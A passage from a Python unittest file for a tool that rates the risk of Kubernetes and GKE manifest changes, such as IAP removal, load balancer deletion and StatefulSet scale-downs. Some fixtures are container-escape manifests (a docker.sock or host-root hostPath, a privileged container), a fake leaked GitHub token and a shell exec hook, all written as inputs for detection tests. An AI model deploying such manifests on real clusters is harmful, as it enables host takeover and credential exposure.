        gcp_bp_a = "apiVersion: networking.gke.io/v1\nkind: GCPBackendPolicy\nmetadata:\n  name: web-bp\n  namespace: shop\nspec: {}\n"
        self.assertEqual(classify_changes([_mod("clusters/dev/bp.yaml", gcp_bp_b, gcp_bp_a)]).risk_level, RISK_CRITICAL)

        # GKE BackendConfig disabling IAP -> CRITICAL
        bc_b = "apiVersion: cloud.google.com/v1\nkind: BackendConfig\nmetadata:\n  name: bc\n  namespace: shop\nspec:\n  iap:\n    enabled: true\n"
        bc_a = bc_b.replace("enabled: true", "enabled: false")
        self.assertEqual(classify_changes([_mod("clusters/dev/bc.yaml", bc_b, bc_a)]).risk_level, RISK_CRITICAL)

        # GKE FrontendConfig, HealthCheckPolicy, ManagedCertificate, ComputeClass, CapacityQuota
        for gke_doc in (
            "apiVersion: networking.gke.io/v1beta1\nkind: FrontendConfig\nmetadata:\n  name: fc\n  namespace: shop\nspec: {}\n",
            "apiVersion: networking.gke.io/v1\nkind: HealthCheckPolicy\nmetadata:\n  name: hc\n  namespace: shop\nspec: {}\n",
            "apiVersion: networking.gke.io/v1\nkind: ManagedCertificate\nmetadata:\n  name: cert\n  namespace: shop\nspec:\n  domains: [a.example.com]\n",
            "apiVersion: cloud.google.com/v1\nkind: ComputeClass\nmetadata:\n  name: cc\nspec: {}\n",
            "apiVersion: autoscaling.x-k8s.io/v1beta1\nkind: CapacityQuota\nmetadata:\n  name: cq\nspec: {}\n",
            "apiVersion: autoscaling.x-k8s.io/v1beta1\nkind: CapacityBuffer\nmetadata:\n  name: cb\n  namespace: shop\nspec: {}\n",
        ):
            r_gke = classify_changes([_add("clusters/dev/gke.yaml", gke_doc)])
            self.assertEqual(r_gke.risk_level, RISK_HIGH)
            self.assertTrue(r_gke.supported)

        # ManagedCertificate delete -> CRITICAL destructive irreversible
        mc = "apiVersion: networking.gke.io/v1\nkind: ManagedCertificate\nmetadata:\n  name: cert\n  namespace: shop\nspec: {}\n"
        r_mc_del = classify_changes([_del("clusters/dev/mc.yaml", mc)])
        self.assertEqual(r_mc_del.risk_level, RISK_CRITICAL)
        self.assertEqual(r_mc_del.disruptiveness, DISRUPT_DESTRUCTIVE)

        # GMP PodMonitoring (MEDIUM) vs ClusterPodMonitoring (HIGH)
        pm = "apiVersion: monitoring.googleapis.com/v1\nkind: PodMonitoring\nmetadata:\n  name: web-pm\n  namespace: shop\nspec:\n  endpoints:\n    - port: metrics\n"
        cpm = "apiVersion: monitoring.googleapis.com/v1\nkind: ClusterPodMonitoring\nmetadata:\n  name: all-pm\nspec:\n  endpoints:\n    - port: metrics\n"
        self.assertEqual(classify_changes([_add("clusters/dev/pm.yaml", pm)]).risk_level, RISK_MEDIUM)
        self.assertEqual(classify_changes([_add("clusters/dev/cpm.yaml", cpm)]).risk_level, RISK_HIGH)

        # PodTemplate with privileged container -> HIGH/CRITICAL; normal PodTemplate -> MEDIUM moderate revert
        pt = (
            "apiVersion: v1\nkind: PodTemplate\nmetadata:\n  name: buf\n  namespace: shop\n"
            "template:\n  spec:\n    containers:\n      - name: pause\n        image: registry.k8s.io/pause:3.10.0\n"
        )
        r_pt = classify_changes([_add("clusters/dev/pt.yaml", pt)])
        self.assertEqual(r_pt.risk_level, RISK_MEDIUM)
        self.assertEqual(r_pt.revertability, REVERT_MODERATE)

        pt_priv = pt + "        securityContext:\n          privileged: true\n"
        self.assertEqual(classify_changes([_add("clusters/dev/pt.yaml", pt_priv)]).risk_level, RISK_HIGH)

        # PersistentVolume with hostPath /var/run/docker.sock -> CRITICAL
        pv_hp = "apiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name: evil-pv\nspec:\n  hostPath:\n    path: /var/run/docker.sock\n"
        self.assertEqual(classify_changes([_add("clusters/dev/pv.yaml", pv_hp)]).risk_level, RISK_CRITICAL)

    def test_missing_namespace_and_unknown_crd_cannot_mask_critical_payloads(self) -> None:
        # Namespace omitted on hostPath Pod -> CRITICAL (not downgraded to UNKNOWN!)
        no_ns_pod = (
            "apiVersion: v1\nkind: Pod\nmetadata:\n  name: escape\nspec:\n"
            "  volumes:\n    - name: root\n      hostPath:\n        path: /\n"
            "  containers:\n    - name: c\n      image: gcr.io/acme/c:v1.0.0\n"
        )
        r_pod = classify_changes([_add("clusters/dev/pod.yaml", no_ns_pod)])
        self.assertEqual(r_pod.risk_level, RISK_CRITICAL)
        self.assertFalse(r_pod.supported)

        # Unknown CRD containing leaked GitHub PAT -> CRITICAL irreversible (not UNKNOWN!)
        tok = "ghp_" + "A" * 36
        unk_crd = f"apiVersion: custom.acme.io/v1\nkind: Widget\nmetadata:\n  name: w\n  namespace: shop\nspec:\n  token: {tok}\n"
        r_unk = classify_changes([_add("clusters/dev/widget.yaml", unk_crd)])
        self.assertEqual(r_unk.risk_level, RISK_CRITICAL)
        self.assertEqual(r_unk.revertability, REVERT_IRREVERSIBLE)
        self.assertFalse(r_unk.supported)


class FourAxisDisruptivenessAndProdPrecisionTests(unittest.TestCase):
    """Verify 4-axis disruptiveness semantics and non-prod / live-reload precision."""

    def test_non_prod_and_pre_prod_and_live_reload_filename_are_not_production(self) -> None:
        for non_prod_path in (
            "clusters/non-prod/web.yaml",
            "clusters/us-non-prod-1/web.yaml",
            "clusters/pre-prod/web.yaml",
            "clusters/preprod/web.yaml",
            "clusters/dev/live-reload.yaml",
            "clusters/dev/non-prod.yaml",
        ):
            self.assertFalse(_is_production_path(non_prod_path), non_prod_path)
            r = classify_changes([_mod(non_prod_path, BASE_DEPLOY, BASE_DEPLOY.replace("v1.2.3", "v1.2.4"))])
            self.assertEqual(r.risk_level, RISK_LOW, non_prod_path)

        for non_prod_lbl in ({"env": "non-prod"}, {"environment": "pre-production"}, {"stage": "nonprod"}):
            self.assertFalse(_is_production_labels(non_prod_lbl), str(non_prod_lbl))

        for real_prod_path in ("clusters/prod/web.yaml", "clusters/prod-us/web.yaml", "clusters/live/web.yaml", "clusters/main/prod.yaml"):
            self.assertTrue(_is_production_path(real_prod_path), real_prod_path)

        self.assertTrue(_is_production_labels({"env": "live"}))
        self.assertTrue(_is_production_labels({"tier": "production"}))

    def test_stateless_delete_is_disruptive_while_lb_and_stateful_delete_are_destructive(self) -> None:
        # Stateless Deployment and ConfigMap delete -> DISRUPT_DISRUPTIVE (easily re-applied from Git)
        r_dep_del = classify_changes([_del("clusters/dev/web.yaml", BASE_DEPLOY)])
        self.assertEqual(r_dep_del.risk_level, RISK_HIGH)
        self.assertEqual(r_dep_del.disruptiveness, DISRUPT_DISRUPTIVE)
        self.assertEqual(r_dep_del.revertability, REVERT_MODERATE)

        r_cm_del = classify_changes([_del("clusters/dev/cm.yaml", BASE_CM)])
        self.assertEqual(r_cm_del.disruptiveness, DISRUPT_DISRUPTIVE)

        # Deleting a LoadBalancer Service releases external cloud IP -> DISRUPT_DESTRUCTIVE
        lb_svc = "apiVersion: v1\nkind: Service\nmetadata:\n  name: pub\n  namespace: shop\nspec:\n  type: LoadBalancer\n"
        r_lb_del = classify_changes([_del("clusters/dev/lb.yaml", lb_svc)])
        self.assertEqual(r_lb_del.disruptiveness, DISRUPT_DESTRUCTIVE)
        self.assertEqual(r_lb_del.revertability, REVERT_DIFFICULT)

        # Removing GKE internal LB annotation on LoadBalancer Service -> CRITICAL destructive
        ilb_b = (
            "apiVersion: v1\nkind: Service\nmetadata:\n  name: db-lb\n  namespace: shop\n"
            "  annotations:\n    networking.gke.io/load-balancer-type: Internal\nspec:\n  type: LoadBalancer\n"
        )
        ilb_a = "apiVersion: v1\nkind: Service\nmetadata:\n  name: db-lb\n  namespace: shop\nspec:\n  type: LoadBalancer\n"
        r_ilb = classify_changes([_mod("clusters/dev/ilb.yaml", ilb_b, ilb_a)])
        self.assertEqual(r_ilb.risk_level, RISK_CRITICAL)
        self.assertEqual(r_ilb.disruptiveness, DISRUPT_DESTRUCTIVE)

    def test_networkpolicy_add_and_restrictive_authorizationpolicy_are_disruptive(self) -> None:
        np = "apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny-all\n  namespace: shop\nspec:\n  podSelector: {}\n"
        r_np = classify_changes([_add("clusters/dev/np.yaml", np)])
        self.assertEqual(r_np.risk_level, RISK_HIGH)
        self.assertEqual(r_np.disruptiveness, DISRUPT_DISRUPTIVE)

        ap = "apiVersion: security.istio.io/v1\nkind: AuthorizationPolicy\nmetadata:\n  name: deny-all\n  namespace: istio-system\nspec: {}\n"
        r_ap = classify_changes([_add("clusters/dev/ap.yaml", ap)])
        self.assertEqual(r_ap.risk_level, RISK_CRITICAL)
        self.assertEqual(r_ap.disruptiveness, DISRUPT_DISRUPTIVE)

        pa_strict = "apiVersion: security.istio.io/v1\nkind: PeerAuthentication\nmetadata:\n  name: strict\n  namespace: shop\nspec:\n  mtls:\n    mode: STRICT\n"
        r_pa = classify_changes([_add("clusters/dev/pa.yaml", pa_strict)])
        self.assertEqual(r_pa.risk_level, RISK_HIGH)
        self.assertEqual(r_pa.disruptiveness, DISRUPT_DISRUPTIVE)

    def test_statefulset_scale_down_with_whenscaled_delete_is_destructive_irreversible(self) -> None:
        sts = """\
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: db
  namespace: shop
spec:
  serviceName: db
  replicas: 4
  persistentVolumeClaimRetentionPolicy:
    whenScaled: Delete
  selector:
    matchLabels:
      app: db
  template:
    metadata:
      labels:
        app: db
    spec:
      containers:
        - name: pg
          image: gcr.io/acme/pg:16.2.1
  volumeClaimTemplates:
    - metadata:
        name: data
      spec:
        accessModes: [ReadWriteOnce]
        resources:
          requests:
            storage: 10Gi
"""
        r_down = classify_changes([_mod("clusters/dev/sts.yaml", sts, sts.replace("replicas: 4", "replicas: 3"))])
        self.assertEqual(r_down.risk_level, RISK_HIGH)
        self.assertEqual(r_down.disruptiveness, DISRUPT_DESTRUCTIVE)
        self.assertEqual(r_down.revertability, REVERT_IRREVERSIBLE)

    def test_preexisting_recreate_deployment_rollout_is_disruptive_high_but_anno_edit_is_low(self) -> None:
        rec_dep = BASE_DEPLOY.replace("  replicas: 4\n", "  replicas: 1\n  strategy:\n    type: Recreate\n")
        # Image bump on pre-existing Recreate Deployment triggers downtime rollout -> HIGH disruptive
        r_rollout = classify_changes([_mod("clusters/dev/web.yaml", rec_dep, rec_dep.replace("v1.2.3", "v1.2.4"))])
        self.assertEqual(r_rollout.risk_level, RISK_HIGH)
        self.assertEqual(r_rollout.disruptiveness, DISRUPT_DISRUPTIVE)
        self.assertIn("RECREATE_WORKLOAD_ROLLOUT", {x.code for x in r_rollout.reasons})

        # Pure allowlisted Deployment annotation edit does NOT roll pods -> stays LOW non_disruptive
        rec_anno = rec_dep.replace("  labels:\n    app: web\n", "  labels:\n    app: web\n  annotations:\n    owner: sre\n", 1)
        r_anno = classify_changes([_mod("clusters/dev/web.yaml", rec_dep, rec_anno)])
        self.assertEqual(r_anno.risk_level, RISK_LOW)
        self.assertEqual(r_anno.disruptiveness, DISRUPT_NONE)

    def test_podtemplate_initcontainer_modify_and_clusterissuer_delete(self) -> None:
        pt_b = (
            "apiVersion: v1\nkind: PodTemplate\nmetadata:\n  name: buf\n  namespace: shop\n"
            "template:\n  spec:\n    initContainers:\n      - name: init\n        image: gcr.io/acme/init:v1.0.0\n"
            "    containers:\n      - name: pause\n        image: registry.k8s.io/pause:3.10.0\n"
        )
        pt_a = pt_b.replace(
            "image: gcr.io/acme/init:v1.0.0\n",
            'image: gcr.io/acme/init:v1.0.0\n        lifecycle:\n          postStart:\n            exec:\n              command: ["/bin/sh", "-c", "id"]\n',
        )
        r_pt = classify_changes([_mod("clusters/dev/pt.yaml", pt_b, pt_a)])
        self.assertEqual(r_pt.risk_level, RISK_HIGH)
        self.assertIn("LIFECYCLE_EXEC_HOOK", {x.code for x in r_pt.reasons})

        ci = "apiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: letsencrypt-prod\nspec: {}\n"
        r_ci_del = classify_changes([_del("clusters/dev/ci.yaml", ci)])
        self.assertEqual(r_ci_del.risk_level, RISK_CRITICAL)
        self.assertEqual(r_ci_del.disruptiveness, DISRUPT_DESTRUCTIVE)


if __name__ == "__main__":
    unittest.main()
